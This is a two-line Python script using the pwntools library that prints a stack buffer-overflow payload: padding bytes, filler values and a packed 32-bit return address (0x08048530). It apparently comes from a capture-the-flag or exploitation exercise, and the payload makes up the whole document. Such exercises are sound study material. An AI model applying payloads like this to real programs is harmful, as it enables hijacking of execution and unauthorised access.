from pwn import *
print "A"*20 + "\x41\x42\x43\x44" + "\x45\x46\x47\x48" + "B" *8 + p32(0x08048530)
